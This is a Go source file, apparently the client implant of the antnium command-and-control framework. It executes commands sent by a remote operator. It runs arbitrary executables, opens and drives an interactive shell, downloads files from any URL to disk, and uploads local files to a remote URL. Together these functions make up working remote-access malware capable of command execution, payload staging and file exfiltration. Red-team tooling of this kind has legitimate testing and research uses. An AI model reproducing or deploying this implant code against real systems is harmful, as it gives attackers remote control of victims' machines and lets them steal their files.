package client

import (
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"

	"github.com/dobin/antnium/model"
	log "github.com/sirupsen/logrus"
	"golang.org/x/text/encoding/charmap"
)

type CommandExec struct {
	interactiveCmd InteractiveCmd
}

func MakeCommandExec() CommandExec {
	interactiveCmd := makeInteractiveCmd()
	commandExec := CommandExec{
		interactiveCmd,
	}
	return commandExec
}

func (s *CommandExec) execute(command *model.CommandBase) error {
	log.WithFields(log.Fields{
		"command": command,
	}).Info("Execute")

	if command.Command == "ping" {
		command.Response = s.actionPing(command.Arguments)
	} else if command.Command == "test" {
		command.Response = s.actionTest(command.Arguments)
	} else if command.Command == "exec" {
		command.Response = s.actionExec(command.Arguments)
	} else if command.Command == "fileupload" {
		command.Response = s.actionFileupload(command.Arguments)
	} else if command.Command == "filedownload" {
		command.Response = s.actionFiledownload(command.Arguments)

	} else if command.Command == "interactiveCmd_open" {
		command.Response = s.actionInteractiveCmdOpen(command.Arguments)
	} else if command.Command == "interactiveCmd_issue" {
		command.Response = s.actionInteractiveCmdIssue(command.Arguments)

	} else {
		command.Response["response"] = "command not found: " + command.Command
	}

	return nil
}

func (s *CommandExec) actionInteractiveCmdOpen(cmdArgument model.CmdArgument) model.CmdResponse {
	ret := make(model.CmdResponse)
	stdout, stderr, err := s.interactiveCmd.open()

	ret["stdout"] = stdout
	ret["stderr"] = stderr
	if err != nil {
		ret["error"] = err.Error()
	}

	return ret
}
func (s *CommandExec) actionInteractiveCmdIssue(cmdArgument model.CmdArgument) model.CmdResponse {
	ret := make(model.CmdResponse)

	// Check and transform input
	commandline, ok := cmdArgument["commandline"]
	if !ok {
		ret["error"] = "No commandline given"
		return ret
	}

	stdout, stderr := s.interactiveCmd.issue(commandline)

	ret["stdout"] = stdout
	ret["stderr"] = stderr

	return ret
}

func (s *CommandExec) actionPing(cmdArgument model.CmdArgument) model.CmdResponse {
	ret := make(model.CmdResponse)
	ret["response"] = "ping answer"
	return ret
}

func (s *CommandExec) actionTest(cmdArgument model.CmdArgument) model.CmdResponse {
	ret := make(model.CmdResponse)
	ret["response"] = "test answer"
	return ret
}

func (s *CommandExec) actionExec(cmdArgument model.CmdArgument) model.CmdResponse {
	ret := make(model.CmdResponse)

	// Check and transform input
	executable, args, err := model.MakeCmdArgumentFrom(cmdArgument)
	if err != nil {
		ret["error"] = err.Error()
		return ret
	}

	// Execute and return result
	log.Infof("Executing: %s %v", executable, args)
	cmd := exec.Command(executable, args...)
	stdout, err := cmd.Output()
	if err != nil {
		// If program didnt exit nicely
		ret["error"] = err.Error()
	} else {
		d := charmap.CodePage850.NewDecoder()
		outDecoded, err := d.Bytes(stdout)
		if err != nil {
			// Fall back to stdout if decoding failed
			ret["stdout"] = string(stdout)
		} else {
			ret["stdout"] = string(outDecoded)
		}
	}
	return ret
}

func (s *CommandExec) actionFiledownload(cmdArgument model.CmdArgument) model.CmdResponse {
	ret := make(model.CmdResponse)

	// Check and transform input
	remoteurl, ok := cmdArgument["remoteurl"]
	if !ok {
		ret["error"] = "No remoteurl given"
		return ret
	}
	destination, ok := cmdArgument["destination"]
	if !ok {
		ret["error"] = "No destination given"
		return ret
	}

	// Download and write file
	resp, err := http.Get(remoteurl)
	if err != nil {
		ret["error"] = err.Error()
		return ret
	}
	defer resp.Body.Close()
	out, err := os.Create(destination)
	if err != nil {
		ret["error"] = err.Error()
		return ret
	}
	defer out.Close()
	written, err := io.Copy(out, resp.Body)
	if err != nil {
		ret["error"] = err.Error()
		return ret
	}

	ret["response"] = fmt.Sprintf("Written %d bytes", written)
	return ret
}

func (s *CommandExec) actionFileupload(cmdArgument model.CmdArgument) model.CmdResponse {
	ret := make(model.CmdResponse)

	// Check and transform input
	remoteurl, ok := cmdArgument["remoteurl"]
	if !ok {
		ret["error"] = "No remoteurl given"
		return ret
	}
	source, ok := cmdArgument["source"]
	if !ok {
		ret["error"] = "No source given"
		return ret
	}

	client := &http.Client{}
	data, err := os.Open(source)
	if err != nil {
		ret["error"] = err.Error()
		return ret
	}
	req, err := http.NewRequest("POST", remoteurl, data)
	if err != nil {
		ret["error"] = err.Error()
		return ret
	}
	resp, err := client.Do(req)
	if err != nil {
		ret["error"] = err.Error()
		return ret
	}
	_, err = ioutil.ReadAll(resp.Body)
	if err != nil {
		ret["error"] = err.Error()
		return ret
	}

	ret["response"] = fmt.Sprintf("Status: %s", resp.Status)
	return ret
}
